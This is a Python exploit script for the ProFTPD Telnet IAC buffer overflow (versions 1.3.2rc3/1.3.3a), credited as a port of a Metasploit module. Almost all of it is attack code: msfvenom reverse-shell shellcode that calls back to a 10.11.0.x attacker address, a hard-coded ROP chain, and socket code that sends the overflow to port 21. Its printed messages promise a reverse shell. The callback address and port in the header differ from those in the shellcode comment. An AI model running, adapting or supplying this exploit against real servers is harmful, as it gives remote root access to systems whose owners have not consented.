#!/usr/bin/python
##
##//#############################################################################################################
##							##							#
## Vulnerability: ProFTPD IAC Remote Root Exploit	##  Telnet IAC Buffer Overflow (Linux)		 	#
## 							##  ProFTPD 1.3.2rc3				 	#
## Vulnerable Application: ProFTPD 1.3.3a	 	##  This is a part of the Metasploit Module, 		#
## Tested on Linux 2.6.32-5-686 			##  exploit/linux/ftp/proftp_telnet_iac			#
##							##							#
## Author: Muhammad Haidari				##  Spawns a reverse shell to 10.11.0.55:1234		#
## Contact: ghmh@outlook.com				##							#
## Website: www.github.com/muhammd			##							#
##							##							#
##//#############################################################################################################
##
##
## TODO: adjust
##
## Usage: python ProFTPD_exploit.py <Remote IP Address>

import sys,os,socket
import struct

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.44 LPORT=8080 CMD=/bin/sh PrependChrootBreak=true --smallest -f python -v payload -b '\x09\x0a\x0b\x0c\x0d\x20\xff'

payload =  ""
payload += "\xb8\xf0\x5e\xe0\x8e\xd9\xce\xd9\x74\x24\xf4\x5f"
payload += "\x2b\xc9\xb1\x1e\x31\x47\x12\x83\xef\xfc\x03\xb7"
payload += "\x50\x02\x7b\x06\xa4\xf3\x5f\x02\x70\xac\x92\x52"
payload += "\x16\x71\xa4\xb1\x8d\xae\xee\xf8\xd2\x38\xd7\x5a"
payload += "\x1e\xba\xd9\x9a\xf0\xdd\x71\x34\xdf\xa8\x61\x22"
payload += "\x22\xf2\xd5\xbe\x91\x84\xf4\x44\x43\xb8\x71\x61"
payload += "\xcc\x0f\x01\xa0\x36\x78\xe1\x91\x8b\xd4\x8c\x17"
payload += "\x85\x3a\xe0\x71\x58\x3c\x92\x24\xd2\x02\x58\x56"
payload += "\x5b\x04\x9b\x3e\x56\xfd\x5b\x92\x0e\x03\x5c\xf5"
payload += "\x5e\x8a\xbd\xb9\x39\xdd\x6c\xea\x76\xde\x07\xed"
payload += "\xb4\x61\x45\x85\x28\x4d\x19\x3d\xdd\xbe\xf2\xdf"
payload += "\x74\x48\xef\x4d\xd4\xc3\x11\xc1\xd1\x1e\x51"

#payload =  ""
#payload += "\x6a\x1d\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
#payload += "\x13\x34\x38\x49\xe4\x83\xeb\xfc\xe2\xf4\x05\xf1"
#payload += "\x78\x3f\x5e\x7e\x11\x29\xb4\x52\x74\x6d\xd7\x52"
#payload += "\x6e\xbc\xf9\xb8\xc0\x3d\x6c\xf5\xc9\xd5\xf4\x68"
#payload += "\x2f\x8c\x1a\x16\xc0\x07\x5e\x05\x10\x54\x38\xf5"
#payload += "\xc9\x06\xce\x52\x74\x6d\xed\x60\x84\x64\x05\xe3"
#payload += "\xbe\x07\x67\x7b\x1a\x8e\x36\xb1\xa8\x54\x52\xf5"
#payload += "\xc9\x77\x6d\x88\x76\x29\xb4\x71\x30\x1d\x5c\x32"
#payload += "\x42\xe4\x03\x50\x4b\xe4\x30\xea\xc0\x05\x84\x5e"
#payload += "\x19\xb5\x67\x8b\x4a\x6d\xd5\xf5\xc9\xb6\x5c\x56"
#payload += "\x66\x97\x5c\x50\x66\xcb\x56\x51\xc0\x07\x66\x6b"
#payload += "\xc0\x05\x84\x33\x84\x64"

# NOTE: All addresses are from the proftpd binary
IACCount = 4096+16
Offset = 0x102c-4
Ret = "0x805a547" 	# pop esi / pop ebp / ret
Writable = "0x80e81a0"  # .data

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

rop = struct.pack("<L",0xcccccccc) # unused
rop += struct.pack("<L",0x805a544)  # mov eax,esi / pop ebx / pop esi / pop ebp / ret
rop += struct.pack("<L",0xcccccccc) # becomes ebx
rop += struct.pack("<L",0xcccccccc) # becomes esi
rop += struct.pack("<L",0xcccccccc) # becomes ebp
# quadruple deref the res pointer :)
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
# skip the pool chunk header
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
# execute the data :)
rop += struct.pack("<L",0x0805c26c) # jmp eax

buf = ''
buf += 'SITE '

buf += payload
if len(buf) % 2 == 0:
	buf += "B"
        print "Buffer was aligned"

buf += "\xff" * (IACCount - len(payload))
buf +="\x90" * (Offset - len(buf))
addrs = struct.pack('<L',0x805a547) #Ret
addrs +=struct.pack('<L',0x80e81a0) #Writable
addrs +=rop
buf += addrs
buf += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)
s.send(buf)
print "Payload Successfully Send...Check your Multi/Handler"
print "....Reverse shell is comming to you..."

data=s.recv(1024)
print data
s.close()
